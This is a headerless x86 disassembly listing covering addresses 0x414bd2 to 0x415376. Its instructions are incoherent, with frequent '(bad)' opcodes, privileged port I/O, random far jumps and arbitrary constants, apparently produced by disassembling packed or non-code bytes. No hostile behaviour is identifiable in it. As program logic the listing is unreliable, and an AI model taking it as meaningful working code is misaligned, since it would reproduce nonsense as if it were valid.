  414bd2:	pop    ebx
  414bd3:	lods   eax,DWORD PTR ds:[esi]
  414bd4:	xchg   edi,eax
  414bd5:	ja     0x414c14
  414bd7:	(bad)  
  414bd8:	or     eax,0x40c313c0
  414bdd:	nop
  414bde:	dec    edi
  414bdf:	cwde   
  414be0:	int    0x85
  414be2:	pop    ebp
  414be3:	jp     0x414be7
  414be5:	push   ds
  414be6:	bound  ecx,QWORD PTR [eax+0x5e]
  414be9:	and    DWORD PTR [ebx],0xffffff98
  414bec:	test   eax,0xd8664c6f
  414bf1:	xchg   ecx,eax
  414bf2:	cmp    bh,BYTE PTR [edi]
  414bf4:	rol    DWORD PTR [ebx],0x82
  414bf7:	retf   0x18bb
  414bfa:	std    
  414bfb:	or     al,al
  414bfd:	sti    
  414bfe:	xor    esi,esp
  414c00:	push   esp
  414c01:	stos   BYTE PTR es:[edi],al
  414c02:	aad    0x50
  414c04:	adc    eax,DWORD PTR [ebp-0x77115ba5]
  414c0a:	sub    DWORD PTR [edi],0x38
  414c0d:	out    dx,eax
  414c0e:	adc    al,0x67
  414c10:	imul   esi,ecx,0xc89a42d6
  414c16:	and    eax,0xf2a022fa
  414c1b:	pop    ecx
  414c1c:	outs   dx,BYTE PTR ds:[esi]
  414c1d:	inc    edx
  414c1e:	jbe    0x414c14
  414c20:	sbb    al,BYTE PTR [edi]
  414c22:	pop    esi
  414c23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c24:	cmc    
  414c25:	scas   eax,DWORD PTR es:[edi]
  414c26:	outs   dx,BYTE PTR ds:[esi]
  414c27:	or     eax,0xfaa45809
  414c2c:	lods   al,BYTE PTR ds:[esi]
  414c2d:	fcom   DWORD PTR [esi]
  414c2f:	lods   eax,DWORD PTR ds:[esi]
  414c30:	clc    
  414c31:	add    eax,0x5394437b
  414c36:	loopne 0x414c84
  414c38:	mov    ecx,0x51d9bdb
  414c3d:	out    dx,al
  414c3e:	jns    0x414c7c
  414c40:	(bad)  
  414c41:	(bad)  
  414c42:	mov    edx,0x7d6526ef
  414c47:	push   cs
  414c48:	imul   BYTE PTR [ecx+0x25]
  414c4b:	sub    BYTE PTR es:[esi],ah
  414c4e:	jle    0x414c1b
  414c50:	and    esp,DWORD PTR [ebx]
  414c52:	popa   
  414c53:	imul   edx
  414c55:	cmp    BYTE PTR [edx-0x79],dl
  414c58:	sbb    esp,esi
  414c5a:	xchg   ebp,eax
  414c5b:	push   edx
  414c5c:	std    
  414c5d:	in     eax,0x31
  414c5f:	(bad)  
  414c60:	jnp    0x414c41
  414c62:	jmp    0x4afd:0x729616c6
  414c69:	pop    ds
  414c6a:	push   edi
  414c6b:	stos   BYTE PTR es:[edi],al
  414c6c:	in     al,0x39
  414c6e:	pop    esp
  414c6f:	cmc    
  414c70:	inc    esi
  414c71:	mov    ah,BYTE PTR [esp+ebp*1+0x3e8eb2b4]
  414c78:	add    al,0xc6
  414c7a:	dec    ecx
  414c7b:	sbb    al,0xeb
  414c7d:	inc    ebp
  414c7e:	mov    eax,0x9fc986dc
  414c83:	out    0x6c,al
  414c85:	lods   al,BYTE PTR ds:[esi]
  414c86:	sub    esp,DWORD PTR [esi+eiz*1+0x263b68c5]
  414c8d:	mov    bh,0xc0
  414c8f:	imul   ebp,DWORD PTR [edx-0x1f6e265a],0xdf9fccc6
  414c99:	and    DWORD PTR [eax+0x5a],esi
  414c9c:	xor    eax,DWORD PTR [ebx]
  414c9e:	mov    cl,0xca
  414ca0:	stc    
  414ca1:	xor    al,bl
  414ca3:	out    0x4c,al
  414ca5:	xchg   edi,eax
  414ca6:	shl    BYTE PTR [eax],cl
  414ca8:	and    ch,BYTE PTR ds:0xc291bd1b
  414cae:	adc    al,0x21
  414cb0:	aaa    
  414cb1:	sti    
  414cb2:	mov    WORD PTR [edi+0x6d730228],fs
  414cb8:	pop    es
  414cb9:	pop    ebx
  414cba:	or     BYTE PTR [ebx],0x59
  414cbd:	out    dx,eax
  414cbe:	push   esp
  414cbf:	dec    ecx
  414cc0:	call   0xaa28:0xa74fde04
  414cc7:	mov    ecx,0x66bd3d52
  414ccc:	addr16 dec ecx
  414cce:	jp     0x414c65
  414cd0:	(bad)  
  414cd1:	sub    eax,0xb825eba9
  414cd6:	or     al,0x60
  414cd8:	push   es
  414cd9:	jmp    0x60cd6ace
  414cde:	dec    edi
  414cdf:	push   DWORD PTR [edi+0x64d9926e]
  414ce5:	dec    ebp
  414ce6:	mov    eax,ds:0x14c92be7
  414ceb:	dec    eax
  414cec:	pop    ebp
  414ced:	sbb    al,0x2d
  414cef:	shl    dh,1
  414cf1:	lea    edx,[edx+0x11]
  414cf4:	inc    esp
  414cf5:	xor    eax,0x8cf5ffc4
  414cfa:	aas    
  414cfb:	mov    ch,0xb6
  414cfd:	lahf   
  414cfe:	sbb    dh,BYTE PTR [ebp-0x16]
  414d01:	mov    ecx,0x7e3979d8
  414d06:	jne    0x414d62
  414d08:	daa    
  414d09:	lds    ebp,FWORD PTR [ebx-0x67379f4c]
  414d0f:	mov    ch,0x8
  414d11:	(bad)  
  414d12:	lock or ebx,DWORD PTR [ecx-0x768267af]
  414d19:	test   al,cl
  414d1b:	pushf  
  414d1c:	xchg   ebp,eax
  414d1d:	outs   dx,DWORD PTR ds:[esi]
  414d1e:	fst    QWORD PTR [edx+0x6e1c0c19]
  414d24:	jne    0x414cdc
  414d26:	mov    ds:0x2066895f,eax
  414d2b:	pop    ds
  414d2c:	mov    ecx,DWORD PTR [edx+0x1c6ed464]
  414d32:	pop    edi
  414d33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d34:	sbb    dl,dl
  414d36:	int    0xb6
  414d38:	or     eax,DWORD PTR [edx-0x1f]
  414d3b:	xor    edx,edx
  414d3d:	jo     0x414cbf
  414d3f:	pop    ebx
  414d40:	call   0xbe5:0xa504e349
  414d47:	enter  0x524,0x5e
  414d4b:	loope  0x414d9e
  414d4d:	mov    eax,0x227c92e7
  414d52:	or     BYTE PTR [edi*1-0x3c274aa8],dl
  414d59:	dec    ecx
  414d5a:	ds cmp al,0x4f
  414d5d:	mov    ds:0x9ba8ac7d,al
  414d62:	pop    ds
  414d63:	push   ebx
  414d64:	inc    ebx
  414d65:	aaa    
  414d66:	dec    ebx
  414d67:	mov    ah,0x5
  414d69:	mov    ds:0x8eaea5c4,eax
  414d6e:	mov    ecx,edx
  414d70:	(bad)  
  414d71:	cmc    
  414d72:	out    0x4c,eax
  414d74:	mov    esi,0x65f9c77d
  414d79:	inc    esp
  414d7a:	loope  0x414d5b
  414d7c:	or     DWORD PTR [edi+0x27],edx
  414d7f:	inc    edi
  414d80:	not    BYTE PTR [ebx-0x1d]
  414d83:	popf   
  414d84:	sbb    esi,DWORD PTR [eax]
  414d86:	mov    esp,0x9be33d55
  414d8b:	lds    ebp,FWORD PTR [ebx]
  414d8d:	dec    ebx
  414d8e:	sbb    ch,bl
  414d90:	sahf   
  414d91:	cmp    ebx,esp
  414d93:	lods   al,BYTE PTR ds:[esi]
  414d94:	sbb    dh,BYTE PTR [ecx+0x42b62dd]
  414d9a:	outs   dx,DWORD PTR ds:[esi]
  414d9b:	and    dl,BYTE PTR ds:0x19539c88
  414da1:	out    0xfd,eax
  414da3:	ret    
  414da4:	mov    dl,BYTE PTR [eax]
  414da6:	pop    edi
  414da7:	add    ecx,DWORD PTR [edx+0x1b]
  414daa:	adc    cl,BYTE PTR [eax]
  414dac:	xchg   esi,eax
  414dad:	jge    0x414d4c
  414daf:	and    eax,0x91a08121
  414db4:	icebp  
  414db5:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414db7:	sbb    BYTE PTR [eax-0x52ce8465],bl
  414dbd:	inc    eax
  414dbe:	mov    eax,ds:0x36d7a02e
  414dc3:	fmul   QWORD PTR es:[eax-0x42]
  414dc7:	aam    0x57
  414dc9:	(bad)  
  414dca:	in     al,0xcd
  414dcc:	jne    0x414e45
  414dce:	int3   
  414dcf:	jmp    0xad7acde7
  414dd4:	iret   
  414dd5:	xchg   ebp,esi
  414dd7:	jg     0x414d93
  414dd9:	mov    WORD PTR [ebx-0x1f],fs
  414ddc:	push   cs
  414ddd:	add    BYTE PTR [ebx-0x10699c73],bh
  414de3:	jb     0x414e5c
  414de5:	sahf   
  414de6:	sub    al,0xab
  414de8:	int    0xf0
  414dea:	pop    es
  414deb:	adc    eax,0x42073b62
  414df0:	pop    ebx
  414df1:	cmp    eax,esp
  414df3:	and    DWORD PTR [esi],esp
  414df5:	out    0x81,al
  414df7:	add    eax,0x90271b6b
  414dfc:	add    ch,BYTE PTR [edx]
  414dfe:	dec    edx
  414dff:	pop    ecx
  414e00:	dec    ebx
  414e01:	jg     0x414e36
  414e03:	xor    esi,edx
  414e05:	pop    edi
  414e06:	inc    edi
  414e07:	sub    eax,0x81596266
  414e0c:	pop    ecx
  414e0d:	jl     0x414e87
  414e0f:	cmp    ebp,DWORD PTR [ebx-0x305fb8d6]
  414e15:	push   es
  414e16:	jae    0x414e81
  414e18:	clc    
  414e19:	fmul   DWORD PTR [ecx]
  414e1b:	cmc    
  414e1c:	push   esi
  414e1d:	add    ebx,DWORD PTR [ebp-0x575840b2]
  414e23:	inc    ebp
  414e24:	mov    edx,0x84d9041f
  414e29:	push   ss
  414e2a:	sub    DWORD PTR [esi],edi
  414e2c:	xor    al,0xaf
  414e2e:	test   al,0xa5
  414e30:	pop    ebx
  414e31:	xchg   esi,eax
  414e32:	jl     0x414e27
  414e34:	mov    DWORD PTR [esp+ebx*8],edx
  414e37:	ss pop es
  414e39:	adc    DWORD PTR [ebx+0x3e],esp
  414e3c:	xchg   BYTE PTR [edi-0x1bdc0fc8],dl
  414e42:	add    ebx,esi
  414e44:	fsubr  st,st(7)
  414e46:	out    dx,al
  414e47:	ss hlt 
  414e49:	test   eax,0x69ecb574
  414e4f:	and    eax,0xec05bfc6
  414e54:	mov    eax,ds:0xf451f3dd
  414e59:	stc    
  414e5a:	lahf   
  414e5b:	clc    
  414e5c:	popf   
  414e5d:	aad    0xf8
  414e5f:	test   DWORD PTR [ebx-0x461014c4],ebx
  414e65:	clc    
  414e66:	mov    db4,esi
  414e69:	sub    al,0xf2
  414e6b:	scas   eax,DWORD PTR es:[edi]
  414e6c:	mov    al,0x3
  414e6e:	ins    DWORD PTR es:[edi],dx
  414e6f:	jae    0x414e89
  414e71:	test   BYTE PTR ds:0x1b23a321,dh
  414e77:	sub    dh,BYTE PTR [edi]
  414e79:	mov    edi,0xa2013f29
  414e7e:	inc    edi
  414e7f:	xchg   esp,eax
  414e80:	xchg   ecx,eax
  414e81:	and    al,0xbe
  414e83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e84:	test   al,0x91
  414e86:	(bad)  
  414e87:	sti    
  414e88:	lods   al,BYTE PTR ds:[esi]
  414e89:	cdq    
  414e8a:	ins    DWORD PTR es:[edi],dx
  414e8b:	pop    eax
  414e8c:	and    BYTE PTR ds:0x9c35437d,ah
  414e92:	(bad)  
  414e93:	not    cl
  414e95:	std    
  414e96:	daa    
  414e97:	xor    DWORD PTR [esi-0x7e],0x7e
  414e9b:	cli    
  414e9c:	popf   
  414e9d:	mov    dl,BYTE PTR [ecx+0x65b15162]
  414ea3:	push   ds
  414ea4:	jb     0x414ea1
  414ea6:	sub    al,0x2
  414ea8:	and    al,0x1e
  414eaa:	out    0xf1,eax
  414eac:	xlat   BYTE PTR ds:[ebx]
  414ead:	add    DWORD PTR [ebp+edx*4+0x5b7fce55],esi
  414eb4:	(bad)  
  414eb5:	mov    ch,0x46
  414eb7:	iret   
  414eb8:	mov    esi,0x7ce2b578
  414ebd:	mov    cs,WORD PTR [ecx-0x6e28f6d7]
  414ec3:	inc    edx
  414ec4:	xor    DWORD PTR [esi],ebp
  414ec6:	push   0x60a2e702
  414ecb:	addr16 in al,dx
  414ecd:	dec    esi
  414ece:	adc    BYTE PTR [eax+ebx*1-0x3d],cl
  414ed2:	in     eax,0xeb
  414ed4:	retf   
  414ed5:	push   esp
  414ed6:	or     al,0x54
  414ed8:	iret   
  414ed9:	push   esp
  414eda:	aad    0x0
  414edc:	test   eax,0x6c9a32e3
  414ee1:	push   cs
  414ee2:	retf   0x2a1f
  414ee5:	xchg   BYTE PTR [ebp-0x1c4bae38],bl
  414eeb:	js     0x414f29
  414eed:	sbb    DWORD PTR [edi+0x19bf9929],eax
  414ef3:	pop    ecx
  414ef4:	js     0x414f37
  414ef6:	icebp  
  414ef7:	test   BYTE PTR [esi-0x41],0x7c
  414efb:	add    al,0xd6
  414efd:	jecxz  0x414f27
  414eff:	push   ebx
  414f00:	xlat   BYTE PTR ds:[ebx]
  414f01:	imul   ebp,DWORD PTR [esi+0x12],0x6b
  414f05:	shl    edx,1
  414f07:	adc    DWORD PTR [ebx],esi
  414f09:	jg     0x414f00
  414f0b:	adc    al,0x80
  414f0d:	dec    esi
  414f0e:	jecxz  0x414ec7
  414f10:	out    dx,eax
  414f11:	mov    al,ds:0x45e14de5
  414f16:	adc    BYTE PTR ss:[edi],ch
  414f19:	test   al,0x49
  414f1b:	aaa    
  414f1c:	sub    BYTE PTR [ecx+esi*1-0x3b1f982a],0x39
  414f24:	iret   
  414f25:	mov    BYTE PTR [edi-0x59dbe765],ah
  414f2b:	lea    esp,[eax+ecx*8]
  414f2e:	or     BYTE PTR [ecx],0x37
  414f31:	sub    dh,BYTE PTR [eax+0x23]
  414f34:	mov    cl,0xc
  414f36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f37:	jbe    0x414ebd
  414f39:	sbb    DWORD PTR [edi],0xe74e4174
  414f3f:	cmp    BYTE PTR [eax+0x5f5fc6d9],0x3c
  414f46:	mov    ecx,0x1b98ba62
  414f4b:	call   0x65a0:0xdd76edd7
  414f52:	sti    
  414f53:	xchg   ecx,eax
  414f54:	mov    bh,0x60
  414f56:	xor    BYTE PTR [ebx],dh
  414f58:	dec    eax
  414f59:	dec    esi
  414f5a:	dec    ebx
  414f5b:	test   BYTE PTR [esi],0xfe
  414f5e:	stos   DWORD PTR es:[edi],eax
  414f5f:	jno    0x414fae
  414f61:	ret    
  414f62:	and    DWORD PTR [esi-0x66521b8e],0xffffffb9
  414f69:	jp     0x414eee
  414f6b:	mov    ebx,0x29649597
  414f70:	hlt    
  414f71:	dec    edx
  414f72:	xor    BYTE PTR [ecx*1+0x701f6649],dh
  414f79:	push   ss
  414f7a:	lods   al,BYTE PTR ds:[esi]
  414f7b:	les    ecx,FWORD PTR [edi+0x53387261]
  414f81:	loope  0x414f4c
  414f83:	shl    ebp,cl
  414f85:	lea    ebp,[eax+0x1e]
  414f88:	add    ecx,0x22
  414f8b:	cs dec ecx
  414f8d:	pop    eax
  414f8e:	or     al,0xd2
  414f90:	sbb    BYTE PTR [edi+0x6e9c9af2],cl
  414f96:	or     DWORD PTR [esi+0x1f],0x38a690d5
  414f9d:	sti    
  414f9e:	push   ss
  414f9f:	cli    
  414fa0:	pusha  
  414fa1:	cmc    
  414fa2:	push   0xb26b26fb
  414fa7:	cmp    ebx,DWORD PTR [edi]
  414fa9:	adc    eax,0x7e7d836a
  414fae:	inc    ebp
  414faf:	sub    edi,esp
  414fb1:	scas   eax,DWORD PTR es:[edi]
  414fb2:	push   0x40
  414fb4:	clc    
  414fb5:	jne    0x414f47
  414fb7:	sbb    al,0xe7
  414fb9:	mov    dh,0x95
  414fbb:	fld    QWORD PTR [ecx-0x6e]
  414fbe:	sub    DWORD PTR [eax-0x4bf040fb],eax
  414fc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fc5:	mov    ebp,0x37c24e6
  414fca:	pop    es
  414fcb:	sbb    ah,ah
  414fcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fce:	stos   WORD PTR es:[edi],ax
  414fd0:	shl    BYTE PTR [edx-0x39239cc7],1
  414fd6:	enter  0x9d47,0x94
  414fda:	or     DWORD PTR [ebx-0x56],ebx
  414fdd:	sub    ah,cl
  414fdf:	(bad)
  414fe2:	mov    al,ds:0x6167e93a
  414fe7:	or     eax,0xea401c03
  414fec:	xor    esp,ebx
  414fee:	test   al,0xec
  414ff0:	push   esp
  414ff1:	int3   
  414ff2:	enter  0x7241,0xb4
  414ff6:	rol    BYTE PTR [ecx-0x44034e2b],1
  414ffc:	out    0xbf,eax
  414ffe:	icebp  
  414fff:	dec    ebx
  415000:	pop    eax
  415001:	inc    eax
  415002:	xchg   edi,eax
  415003:	leave  
  415004:	pusha  
  415005:	jbe    0x415035
  415007:	pop    ebx
  415008:	adc    DWORD PTR [esi+0x48],edx
  41500b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41500c:	repz fsub DWORD PTR [edx]
  41500f:	sbb    al,0x25
  415011:	pop    edi
  415012:	shl    BYTE PTR [ecx+edx*2],0xd
  415016:	jno    0x414f98
  415018:	jns    0x415057
  41501a:	rcr    dl,cl
  41501c:	and    al,0xe6
  41501e:	jb     0x415041
  415020:	pushf  
  415021:	mov    dl,0x5
  415023:	inc    edx
  415024:	pushf  
  415025:	add    eax,0xcc994219
  41502a:	les    edi,FWORD PTR [edi]
  41502c:	mov    esi,0xa4cb4d23
  415031:	jl     0x415065
  415033:	adc    eax,0x98257573
  415038:	ins    BYTE PTR es:[edi],dx
  415039:	test   BYTE PTR [ecx+edi*8],bl
  41503c:	dec    esi
  41503d:	or     DWORD PTR [eax],edi
  41503f:	cmp    DWORD PTR [ebx+0x6f],ebx
  415042:	(bad)  [edi]
  415044:	ret    
  415045:	cmp    al,0x43
  415047:	lods   eax,DWORD PTR ds:[esi]
  415048:	mov    dh,0x1f
  41504a:	push   ds
  41504b:	stc    
  41504c:	jge    0x415082
  41504e:	xchg   ebx,eax
  41504f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415050:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415051:	push   esi
  415052:	xor    DWORD PTR [ebp+0x52ca96d1],ecx
  415058:	pusha  
  415059:	lods   eax,DWORD PTR ds:[esi]
  41505a:	aaa    
  41505b:	inc    ecx
  41505c:	xchg   BYTE PTR [ecx+0xb270951],dh
  415062:	jle    0x415039
  415064:	(bad)  
  415065:	ja     0x414fe8
  415067:	xor    BYTE PTR [ebp-0x59d8d97d],al
  41506d:	lods   eax,DWORD PTR ds:[esi]
  41506e:	pop    esp
  41506f:	or     al,0x2d
  415071:	inc    esp
  415072:	repz push 0xeb803f18
  415078:	xor    ebp,DWORD PTR [eax+0xc]
  41507b:	mov    esi,0x423ecdcf
  415080:	push   esp
  415081:	mov    cl,0x72
  415083:	push   es
  415084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415085:	icebp  
  415086:	stos   BYTE PTR es:[edi],al
  415087:	test   DWORD PTR [ecx-0x2e],ebx
  41508a:	sbb    edx,DWORD PTR [esi-0x36]
  41508d:	mov    al,0xc8
  41508f:	jmp    0xcd5dee38
  415094:	sahf   
  415095:	mov    al,ds:0xcc0240b7
  41509a:	cmc    
  41509b:	imul   esp,DWORD PTR ds:0xc0e565b6,0x5a
  4150a2:	mov    ds:0x9c33c73,eax
  4150a7:	jmp    0x39186079
  4150ac:	and    al,0x9a
  4150ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150af:	mov    eax,ds:0xe546de5c
  4150b4:	mov    WORD PTR [esi-0x60914d42],?
  4150ba:	ja     0x4150e4
  4150bc:	xlat   BYTE PTR ds:[ebx]
  4150bd:	fadd   DWORD PTR [eax-0x46a34bd4]
  4150c3:	hlt    
  4150c4:	add    al,0x76
  4150c6:	xor    ebx,esi
  4150c8:	repnz dec eax
  4150ca:	(bad)  
  4150cb:	loop   0x4150d2
  4150cd:	and    eax,0xdbf65843
  4150d2:	popf   
  4150d3:	jmp    0x415070
  4150d5:	fucomp st(0)
  4150d7:	pop    esp
  4150d8:	add    eax,0xcf0ee4b6
  4150dd:	cmp    dl,bh
  4150df:	sbb    al,BYTE PTR [edi-0x7117aadc]
  4150e5:	sub    DWORD PTR [ecx],ebp
  4150e7:	inc    esp
  4150e8:	lahf   
  4150e9:	rcl    DWORD PTR [eax],1
  4150eb:	bound  ebp,QWORD PTR [eax+0x70094f71]
  4150f1:	jle    0x41508f
  4150f3:	mov    ds:0xa3994ae3,al
  4150f8:	fcomip st,st(7)
  4150fa:	mov    ah,0x1b
  4150fc:	mov    DWORD PTR [edi-0x26098513],esp
  415102:	dec    ebx
  415103:	cwde   
  415104:	push   edi
  415105:	mov    DWORD PTR [ecx],edi
  415107:	imul   esp,DWORD PTR [ebp+0x2e05e320],0x53d91a9c
  415111:	(bad)  
  415112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415113:	iret   
  415114:	fs mov ebx,0x8bb3ef9f
  41511a:	lahf   
  41511b:	inc    edx
  41511c:	les    esi,FWORD PTR ds:0xa200b8e2
  415122:	stc    
  415123:	adc    ah,BYTE PTR [ebx+0x34c54c80]
  415129:	es test al,0x10
  41512c:	or     al,0xb0
  41512e:	and    DWORD PTR [ecx-0x44],ebp
  415131:	cmp    ah,BYTE PTR [edx+0x104cff52]
  415137:	inc    esi
  415138:	xchg   ebx,eax
  415139:	jmp    DWORD PTR [edi-0x10]
  41513c:	jmp    0x180d:0x40f0af43
  415143:	sti    
  415144:	jno    0x415173
  415146:	pop    es
  415147:	jg     0x4151a4
  415149:	jp     0x415199
  41514b:	lock je 0x41516a
  41514e:	xchg   esi,eax
  41514f:	sbb    DWORD PTR [ebx],eax
  415151:	adc    ebx,DWORD PTR [eax]
  415153:	arpl   WORD PTR [esi+0x0],ax
  415156:	out    dx,al
  415157:	mov    cl,0xe2
  415159:	dec    eax
  41515a:	ja     0x4151d8
  41515c:	cmp    al,0x3f
  41515e:	add    eax,0x3ef8405f
  415163:	ret    0x3b17
  415166:	cmovae edi,esi
  415169:	xor    al,BYTE PTR [ecx-0x79]
  41516c:	or     BYTE PTR [edi],ch
  41516e:	jmp    0x415174
  415170:	and    bh,BYTE PTR [ecx+0x47c63e2e]
  415176:	cmp    BYTE PTR [ebx+ebx*1-0x7aa771e4],bl
  41517d:	dec    ebp
  41517e:	mov    edx,0x75f1478a
  415183:	dec    edx
  415184:	test   al,0x35
  415186:	pop    edx
  415187:	lds    ebx,FWORD PTR [edx]
  415189:	into   
  41518a:	jo     0x415195
  41518c:	dec    edi
  41518d:	fiadd  DWORD PTR [esi+0x36f5989a]
  415193:	dec    ebx
  415194:	(bad)  
  415195:	xchg   esi,eax
  415196:	ss sbb eax,0xd210de61
  41519c:	mov    esp,0xa794fac8
  4151a1:	inc    esi
  4151a2:	fisub  WORD PTR [edx]
  4151a4:	adc    cl,al
  4151a6:	jnp    0x4151ae
  4151a8:	scas   al,BYTE PTR es:[edi]
  4151a9:	stos   DWORD PTR es:[edi],eax
  4151aa:	in     eax,0xb0
  4151ac:	call   0x5cb:0x41567af1
  4151b3:	dec    esi
  4151b4:	adc    al,0x35
  4151b6:	inc    esi
  4151b7:	fldcw  WORD PTR [ebp+0x22]
  4151ba:	lods   al,BYTE PTR ds:[esi]
  4151bb:	mov    al,BYTE PTR [eax+0x14]
  4151be:	ss jo  0x4151d2
  4151c1:	pop    edi
  4151c2:	out    dx,eax
  4151c3:	mov    ecx,0x447930d7
  4151c8:	add    eax,0x24bc2f9
  4151cd:	dec    ebx
  4151ce:	into   
  4151cf:	pop    eax
  4151d0:	sub    dl,BYTE PTR [ecx+0x79]
  4151d3:	and    edi,DWORD PTR [esi-0x3]
  4151d6:	ret    0x9699
  4151d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151da:	mov    bl,BYTE PTR [edx+ebx*1+0x47]
  4151de:	inc    edi
  4151df:	ins    BYTE PTR es:[edi],dx
  4151e0:	push   ds
  4151e1:	cmp    BYTE PTR [ebp+ecx*1-0x7e049e59],0x4e
  4151e9:	push   edi
  4151ea:	mov    BYTE PTR [ebp-0x72ecb3f2],cl
  4151f0:	mov    cl,0x44
  4151f2:	xchg   esi,eax
  4151f3:	jg     0x4151d0
  4151f5:	sub    ecx,DWORD PTR [edi]
  4151f7:	mov    ds:0xbf4020ed,al
  4151fc:	enter  0x2e35,0xae
  415200:	mov    ds:0x716019b5,eax
  415205:	or     eax,0x1c21a3c7
  41520a:	mov    eax,0xbfa056b9
  41520f:	push   cs
  415210:	xchg   esi,eax
  415211:	mov    WORD PTR [ebx+eax*4-0x46],fs
  415215:	mov    edi,0xfc155ef
  41521a:	jg     0x4151f9
  41521c:	ror    DWORD PTR [edi+0x23536302],1
  415222:	vpmacssww ymm0,ymm5,ymm5,YMMWORD PTR [ebx]
  415228:	out    dx,eax
  415229:	shl    BYTE PTR [ecx],cl
  41522b:	enter  0x1a29,0x91
  41522f:	mov    edx,0x3515c490
  415234:	adc    ah,dh
  415236:	icebp  
  415237:	outs   dx,DWORD PTR ds:[esi]
  415238:	mov    esp,0xa54c43aa
  41523d:	clc    
  41523e:	retf   0xd67a
  415241:	or     DWORD PTR ds:0x6daaedd8,edx
  415247:	into   
  415248:	pop    ecx
  415249:	jb     0x415274
  41524b:	cmc    
  41524c:	mov    al,ds:0x6bcce38d
  415251:	aad    0xf7
  415253:	pop    ebx
  415254:	sbb    bh,BYTE PTR [edi+0xe]
  415257:	push   DWORD PTR [edi-0x2ab24f99]
  41525d:	adc    esi,esi
  41525f:	or     al,0xf6
  415261:	ins    BYTE PTR es:[edi],dx
  415262:	or     eax,DWORD PTR [ebx-0x25fd2ba7]
  415268:	push   esp
  415269:	int    0xb8
  41526b:	and    DWORD PTR [ebp+ecx*8+0x71],edx
  41526f:	dec    ecx
  415270:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415271:	loope  0x4151f5
  415273:	retf   
  415274:	icebp  
  415275:	arpl   WORD PTR [edi+0x7f],sp
  415278:	mul    DWORD PTR [edx]
  41527a:	mov    esp,0x762c3ac
  41527f:	ja     0x4152f0
  415281:	loop   0x41520f
  415283:	cmp    edi,0xffffffc5
  415286:	cdq    
  415287:	dec    al
  415289:	mov    dh,0x1b
  41528b:	mov    al,0x93
  41528d:	outs   dx,DWORD PTR ds:[esi]
  41528e:	and    ah,BYTE PTR [edi-0x15]
  415291:	cmp    al,BYTE PTR [ebx+0xdfc377]
  415297:	das    
  415298:	je     0x41530e
  41529a:	stos   DWORD PTR es:[edi],eax
  41529b:	mov    bh,0xe6
  41529d:	dec    edx
  41529e:	pop    es
  41529f:	(bad)  
  4152a0:	arpl   ax,bp
  4152a2:	jl     0x4152df
  4152a4:	test   al,0x47
  4152a6:	lods   eax,DWORD PTR ds:[esi]
  4152a7:	rol    BYTE PTR [edi+0x7e69f0d2],1
  4152ad:	adc    DWORD PTR [edi-0x5e],esp
  4152b0:	retf   0x21df
  4152b3:	jmp    0x41527d
  4152b5:	push   cs
  4152b6:	stos   DWORD PTR es:[edi],eax
  4152b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152b8:	mov    dh,ah
  4152ba:	pop    ebp
  4152bb:	pop    ebx
  4152bc:	push   DWORD PTR [ebx]
  4152be:	or     edi,edi
  4152c0:	jg     0x4152f7
  4152c2:	xor    DWORD PTR [esp+esi*2-0x60],eax
  4152c6:	arpl   WORD PTR [eax+esi*4+0x2b],ax
  4152ca:	out    0xbc,al
  4152cc:	clc    
  4152cd:	mov    WORD PTR [edx],ss
  4152cf:	pop    edx
  4152d0:	das    
  4152d1:	and    eax,0x29ce6afc
  4152d6:	xor    DWORD PTR [ebx+eax*8+0x54c82e89],ebx
  4152dd:	and    BYTE PTR ss:[ecx],bh
  4152e0:	daa    
  4152e1:	dec    edx
  4152e2:	mov    bl,0x4f
  4152e4:	xchg   esp,eax
  4152e5:	xchg   edi,eax
  4152e6:	std    
  4152e7:	(bad)  
  4152e8:	out    dx,eax
  4152e9:	and    al,0xab
  4152ec:	sbb    DWORD PTR [ebx+eax*1-0x27],ecx
  4152f0:	popf   
  4152f1:	loop   0x415273
  4152f3:	out    0x14,eax
  4152f5:	inc    edx
  4152f6:	test   eax,0x92b39e38
  4152fb:	retf   
  4152fc:	ret    
  4152fd:	add    eax,0xcbb99fed
  415302:	xor    esi,esp
  415304:	rol    ah,cl
  415306:	mov    esi,0xa7720a93
  41530b:	js     0x4152f0
  41530d:	pop    esi
  41530e:	out    0x3d,al
  415310:	sub    eax,0xd73dfe7e
  415315:	jne    0x41537e
  415317:	push   ebx
  415318:	lods   al,BYTE PTR ds:[esi]
  415319:	shr    BYTE PTR [ebp+0x28dbb030],0xb2
  415320:	mov    esi,0xe4688466
  415325:	gs das 
  415327:	push   0xb60fe418
  41532c:	popa   
  41532d:	retf   
  41532e:	adc    ebx,esi
  415330:	cmp    DWORD PTR [ecx-0x3c5e98b9],0xffffff98
  415337:	pushf  
  415338:	shl    DWORD PTR [ebx+ebx*4],1
  41533b:	push   edi
  41533c:	pop    edx
  41533d:	and    eax,DWORD PTR [ecx+0x32b7c00f]
  415343:	jns    0x4152ed
  415345:	mov    al,ds:0xa24da17c
  41534a:	je     0x415390
  41534c:	cmc    
  41534d:	(bad)  
  41534e:	mov    dh,0x65
  415350:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415351:	mov    ecx,0xff03cbf5
  415356:	jle    0x41532b
  415358:	fadd   QWORD PTR [edx+0x6c2a1336]
  41535e:	div    ecx
  415360:	xor    BYTE PTR [ebx-0x4d],bh
  415363:	stos   DWORD PTR es:[edi],eax
  415364:	aam    0x1d
  415366:	adc    BYTE PTR [esi-0x7eea6d2f],dh
  41536c:	repz push cs
  41536e:	fdiv   DWORD PTR ds:0xe4976f72
  415374:	out    0x78,eax
  415376:	ss nop
